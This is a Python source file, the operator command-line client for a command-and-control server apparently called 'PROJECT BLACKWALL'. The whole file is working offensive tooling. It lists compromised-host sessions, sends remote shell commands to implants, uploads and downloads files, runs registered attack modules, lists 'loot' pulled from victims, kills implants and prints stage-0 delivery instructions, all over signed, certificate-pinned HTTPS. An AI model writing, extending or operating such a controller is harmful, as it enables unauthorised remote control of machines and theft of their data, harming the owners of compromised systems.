#!/usr/bin/env python3
"""PROJECT BLACKWALL // operator CLI for the HTTPS C2."""

import argparse
import base64
import hashlib
import json
import os
import ssl
import sys
import time
import urllib.parse
from http.client import HTTPSConnection

HERE = os.path.dirname(os.path.abspath(__file__))
PROJECT = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, HERE)

import c2_common as C  # noqa: E402

DEFAULT_DIR = os.path.join(PROJECT, "artifacts", "c2")

B_RED = "1;38;2;255;65;0"
MAGMA = "38;2;255;130;130"
VOID = "38;2;60;10;15"


def paint(text, code):
    if not sys.stdout.isatty():
        return text
    return "\033[%sm%s\033[0m" % (code, text)


def quote(text):
    if sys.stdout.isatty():
        print("%s%s\"%s\"\033[0m" % ("\033[%sm" % VOID, "\033[3m", text))


class Client:
    def __init__(self, root, url="", secret="", ca="", insecure=False, client_cert="", client_key=""):
        doc = C.read_json(os.path.join(root, "operator.json"), {})
        self.url = (url or doc.get("url") or "").rstrip("/")
        self.secret = C.b64d(secret or doc.get("admin_secret") or "")
        self.ca = ca or doc.get("ca") or os.path.join(root, "certs", "server.crt")
        self.fingerprint = (doc.get("fingerprint") or "").upper()
        self.client_cert = client_cert or doc.get("client_cert") or ""
        self.client_key = client_key or doc.get("client_key") or ""
        if not self.url or not self.secret:
            raise SystemExit("operator.json is missing; run c2_pack.py build first")
        parsed = urllib.parse.urlsplit(self.url)
        self.host = parsed.hostname or ""
        self.port = parsed.port or 443
        self.prefix = parsed.path.rstrip("/")
        self.insecure = insecure
        self.ctx = self._context()

    def _context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        if self.insecure:
            ctx.verify_mode = ssl.CERT_NONE
        else:
            ctx.verify_mode = ssl.CERT_REQUIRED
            ctx.load_verify_locations(cafile=self.ca)
        if self.client_cert and self.client_key:
            ctx.load_cert_chain(self.client_cert, self.client_key)
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        except AttributeError:
            pass
        return ctx

    def request(self, method, path, obj=None, timeout=15):
        body = b""
        if obj is not None:
            body = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        full = self.prefix + path
        ts = str(int(time.time()))
        nonce = os.urandom(16).hex()
        headers = {
            "X-BW-Ts": ts,
            "X-BW-Nonce": nonce,
            "X-BW-Sig": C.sign(self.secret, method, full, ts, nonce, body),
            "X-BW-Proto": "1",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Connection": "close",
        }
        conn = HTTPSConnection(self.host, self.port, context=self.ctx, timeout=timeout)
        try:
            conn.connect()
            if not self.insecure and conn.sock is not None:
                der = conn.sock.getpeercert(binary_form=True)
                fp = hashlib.sha256(der or b"").hexdigest().upper()
                if self.fingerprint and fp != self.fingerprint:
                    raise SystemExit("server certificate pin mismatch")
            conn.request(method, full, body=body, headers=headers)
            resp = conn.getresponse()
            data = resp.read()
            status = resp.status
        finally:
            conn.close()
        if status >= 400:
            raise SystemExit("HTTP %s: %s" % (status, data.decode("utf-8", "replace")))
        return json.loads(data.decode("utf-8")) if data else {}

    def get(self, path):
        return self.request("GET", path)

    def post(self, path, obj):
        return self.request("POST", path, obj)


def _wait(client, tid, timeout=180):
    deadline = time.time() + timeout
    while time.time() < deadline:
        task = client.get("/api/admin/task/" + urllib.parse.quote(tid))
        if task.get("state") in ("done", "error"):
            return task
        time.sleep(1)
    raise SystemExit("timeout waiting for task %s" % tid)


def _print_json(obj):
    print(json.dumps(obj, indent=2, ensure_ascii=False))


def _print_task(task, show_json=False):
    if show_json:
        _print_json(task)
        return 0 if task.get("state") == "done" else 1
    result = task.get("result") or {}
    output = result.get("output")
    ok = bool(result.get("ok"))
    if isinstance(output, dict):
        if output.get("b64") or (output.get("file") or {}).get("b64"):
            file_obj = output.get("file") or output
            print("[file] %s (%s bytes%s)" % (
                file_obj.get("name", "?"),
                file_obj.get("size", "?"),
                ", truncated" if file_obj.get("truncated") else "",
            ))
        if output.get("stdout"):
            sys.stdout.write(output["stdout"])
            if not output["stdout"].endswith("\n"):
                sys.stdout.write("\n")
        if output.get("stderr"):
            sys.stderr.write(output["stderr"])
            if not output["stderr"].endswith("\n"):
                sys.stderr.write("\n")
        if "rc" in output:
            print("[rc=%s duration=%ss]" % (output.get("rc"), output.get("duration", "?")))
        elif output.get("error"):
            print("[error] %s" % output["error"])
        elif output.get("entries") is not None:
            for entry in output.get("entries", []):
                print("%-8s %10s %s%s" % (
                    entry.get("mode", ""),
                    entry.get("size", ""),
                    entry.get("name", ""),
                    "/" if entry.get("dir") else "",
                ))
        elif output.get("path") and "bytes" in output:
            print("[write] %s (%s bytes)" % (output["path"], output["bytes"]))
        elif output.get("seconds"):
            print("[sleep] %ss" % output["seconds"])
        elif output.get("pong"):
            print("[pong] %s" % output["pong"])
        elif output.get("bye"):
            print("[exit] session closed")
        else:
            _print_json(output)
    elif output:
        print(output)
    return 0 if ok else 1


def cmd_sessions(client, args):
    data = client.get("/api/admin/sessions")
    sessions = data.get("sessions", [])
    if args.json:
        _print_json(data)
        return 0
    if not sessions:
        print("[C2] no sessions")
        quote("The little window will only be five milliseconds. I hope you're watching.")
        return 0
    print(paint("%-12s %-5s %-18s %-12s %-6s %-16s %s" % ("SESSION", "AGE", "HOST", "USER", "UID", "IP", "TASKS"), B_RED))
    for s in sessions:
        print("%-12s %-5s %-18s %-12s %-6s %-16s q%d/r%d" % (
            s["id"],
            "%ss" % s.get("age", "?"),
            (s.get("hostname") or "?")[:18],
            (s.get("user") or "?")[:12],
            s.get("uid", "?"),
            (s.get("ip") or "?")[:16],
            s.get("queued", 0),
            s.get("running", 0),
        ))
    quote("The little window will only be five milliseconds. I hope you're watching.")
    return 0


def cmd_show(client, args):
    _print_json(client.get("/api/admin/session/" + urllib.parse.quote(args.sid)))
    return 0


def cmd_shell(client, args):
    cmd = " ".join(args.cmd).strip()
    if not cmd:
        raise SystemExit("empty command")
    task = client.post("/api/admin/task", {
        "session": args.sid,
        "kind": "shell",
        "args": {"cmd": cmd, "timeout": args.timeout},
    })["task"]
    print("[task] %s queued" % task["id"])
    if args.no_wait:
        return 0
    return _print_task(_wait(client, task["id"], args.wait), args.json)


def cmd_module(client, args):
    margs = " ".join(args.margs).strip()
    task = client.post("/api/admin/task", {
        "session": args.sid,
        "kind": "module",
        "args": {"name": args.name, "args": margs, "timeout": args.timeout},
    })["task"]
    print("[task] %s queued (%s)" % (task["id"], args.name))
    if args.no_wait:
        return 0
    return _print_task(_wait(client, task["id"], args.wait), args.json)


def cmd_upload(client, args):
    raw = open(args.local, "rb").read()
    if len(raw) > 8 * 1024 * 1024:
        raise SystemExit("file too large for a single upload (8 MiB cap)")
    task = client.post("/api/admin/task", {
        "session": args.sid,
        "kind": "upload",
        "args": {
            "path": args.remote,
            "b64": base64.b64encode(raw).decode("ascii"),
            "mode": int(args.mode, 8),
        },
    })["task"]
    print("[task] %s queued (%d bytes)" % (task["id"], len(raw)))
    if args.no_wait:
        return 0
    return _print_task(_wait(client, task["id"], args.wait), args.json)


def cmd_download(client, args):
    task = client.post("/api/admin/task", {
        "session": args.sid,
        "kind": "download",
        "args": {"path": args.remote, "max": args.max},
    })["task"]
    print("[task] %s queued" % task["id"])
    if args.no_wait:
        return 0
    done = _wait(client, task["id"], args.wait)
    if args.json:
        return _print_task(done, True)
    if done.get("state") != "done":
        return _print_task(done, False)
    output = (done.get("result") or {}).get("output") or {}
    file_obj = output.get("file") or output
    raw = base64.b64decode(file_obj.get("b64", "")) if file_obj.get("b64") else b""
    if args.local:
        with open(args.local, "wb") as fh:
            fh.write(raw)
        print("[saved] %s (%d bytes)" % (args.local, len(raw)))
    elif raw:
        sys.stdout.buffer.write(raw)
    return 0 if raw or output else 1


def cmd_tasks(client, args):
    path = "/api/admin/tasks"
    if args.sid:
        path += "?session=" + urllib.parse.quote(args.sid)
    data = client.get(path)
    if args.json:
        _print_json(data)
        return 0
    for task in data.get("tasks", []):
        result = task.get("result") or {}
        print("%-11s %-8s %-10s %-12s %s" % (
            task.get("id", "?"),
            task.get("kind", "?"),
            task.get("state", "?"),
            task.get("sid", "?"),
            "ok" if result.get("ok") else ("fail" if result else ""),
        ))
    quote("The code behind me has begun to permeate the physical world.")
    return 0


def cmd_wait(client, args):
    return _print_task(_wait(client, args.tid, args.wait), args.json)


def cmd_kill(client, args):
    task = client.post("/api/admin/kill", {"session": args.sid})["task"]
    print("[task] %s queued (exit)" % task["id"])
    return 0


def cmd_modules(client, args):
    data = client.get("/api/admin/modules")
    if args.json:
        _print_json(data)
        return 0
    for name, meta in sorted(data.get("modules", {}).items()):
        print("%-16s %-4s %8s B  %s" % (
            name, meta.get("kind", "?"), meta.get("size", "?"), meta.get("desc", "")
        ))
    quote("The code behind me has begun to permeate the physical world.")
    return 0


def cmd_add_module(client, args):
    raw = open(args.file, "rb").read()
    name = args.name or os.path.splitext(os.path.basename(args.file))[0]
    kind = args.kind or ("py" if args.file.endswith(".py") else "sh")
    needs_secret = False
    for line in raw.decode("utf-8", "replace").splitlines()[:12]:
        text = line.strip()
        if text.startswith(("# SECRET:", "// SECRET:", "# NEEDS_SECRET:", "// NEEDS_SECRET:")):
            needs_secret = text.split(":", 1)[1].strip().lower() in ("1", "yes", "true")
    meta = client.post("/api/admin/module", {
        "name": name,
        "content_b64": base64.b64encode(raw).decode("ascii"),
        "desc": args.desc or name,
        "kind": kind,
        "requires": [x for x in (args.requires or "").split(",") if x],
        "needs_secret": needs_secret,
    })["module"]
    _print_json(meta)
    return 0


def cmd_loot(client, args):
    path = "/api/admin/loot"
    if args.sid:
        path += "?session=" + urllib.parse.quote(args.sid)
    data = client.get(path)
    if args.json:
        _print_json(data)
        return 0
    for item in data.get("loot", []):
        print("%-12s %10s  %s" % (item.get("session", "?"), item.get("size", "?"), item.get("name", "?")))
    return 0


def cmd_events(client, args):
    data = client.get("/api/admin/events")
    if args.json:
        _print_json(data)
        return 0
    for event in data.get("events", []):
        print("%s %-8s %-10s %s" % (
            time.strftime("%H:%M:%S", time.localtime(event.get("ts", 0))),
            event.get("kind", "?"),
            event.get("sid", ""),
            C.redact(event.get("text", ""), 100),
        ))
    return 0


def cmd_note(client, args):
    data = client.post("/api/admin/note", {"session": args.sid, "text": " ".join(args.text)})
    print("[ok] %s" % data.get("ok"))
    return 0


def cmd_ping(client, args):
    _print_json(client.get("/api/admin/ping"))
    return 0


def cmd_stage(client, args):
    path = os.path.join(args.dir, "stage", "deploy.txt")
    try:
        print(open(path, "r", encoding="utf-8").read())
    except OSError:
        raise SystemExit("no stage built in %s" % args.dir)
    quote("A king does not rule by force, but by the consent of the governed.")
    return 0


def add_common(sub, name, help_text, func):
    p = sub.add_parser(name, help=help_text)
    p.add_argument("--json", action="store_true", help="raw JSON output")
    p.add_argument("--wait", type=int, default=180, help="task wait timeout, seconds")
    p.add_argument("--no-wait", action="store_true", help="do not wait for a result")
    p.set_defaults(func=func)
    return p


def main(argv=None):
    parser = argparse.ArgumentParser(description="PROJECT BLACKWALL C2 operator CLI")
    parser.add_argument("--dir", default=DEFAULT_DIR)
    parser.add_argument("--url", default="")
    parser.add_argument("--secret", default="")
    parser.add_argument("--ca", default="")
    parser.add_argument("--client-cert", default="")
    parser.add_argument("--client-key", default="")
    parser.add_argument("--insecure", action="store_true")
    sub = parser.add_subparsers(dest="cmd")

    p = add_common(sub, "sessions", "list active sessions", cmd_sessions)

    p = add_common(sub, "show", "show one session and its task list", cmd_show)
    p.add_argument("sid")

    p = add_common(sub, "shell", "run a shell command on a session", cmd_shell)
    p.add_argument("sid")
    p.add_argument("--timeout", type=int, default=30)
    p.add_argument("cmd", nargs=argparse.REMAINDER)

    p = add_common(sub, "module", "run a sealed module on a session", cmd_module)
    p.add_argument("sid")
    p.add_argument("name")
    p.add_argument("--timeout", type=int, default=300)
    p.add_argument("margs", nargs=argparse.REMAINDER)

    p = add_common(sub, "upload", "upload a file to a session", cmd_upload)
    p.add_argument("sid")
    p.add_argument("local")
    p.add_argument("remote")
    p.add_argument("--mode", default="600")

    p = add_common(sub, "download", "download a file from a session", cmd_download)
    p.add_argument("sid")
    p.add_argument("remote")
    p.add_argument("local", nargs="?", default="")
    p.add_argument("--max", type=int, default=4 * 1024 * 1024)

    p = add_common(sub, "tasks", "list queued/finished tasks", cmd_tasks)
    p.add_argument("sid", nargs="?", default="")

    p = add_common(sub, "wait", "wait for a task", cmd_wait)
    p.add_argument("tid")

    p = add_common(sub, "kill", "tell an implant to exit", cmd_kill)
    p.add_argument("sid")

    p = add_common(sub, "modules", "list sealed modules", cmd_modules)

    p = add_common(sub, "add-module", "seal and register a new module", cmd_add_module)
    p.add_argument("file")
    p.add_argument("--name", default="")
    p.add_argument("--desc", default="")
    p.add_argument("--kind", default="")
    p.add_argument("--requires", default="")

    p = add_common(sub, "loot", "list loot pulled from sessions", cmd_loot)
    p.add_argument("sid", nargs="?", default="")

    p = add_common(sub, "events", "show the server event ring", cmd_events)

    p = add_common(sub, "note", "attach a note to a session", cmd_note)
    p.add_argument("sid")
    p.add_argument("text", nargs=argparse.REMAINDER)

    p = add_common(sub, "ping", "check the server", cmd_ping)

    p = add_common(sub, "stage", "print stage-0 delivery instructions", cmd_stage)

    args = parser.parse_args(argv)
    if not getattr(args, "func", None):
        parser.print_help()
        return 1
    client = Client(args.dir, args.url, args.secret, args.ca, args.insecure, args.client_cert, args.client_key)
    return args.func(client, args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
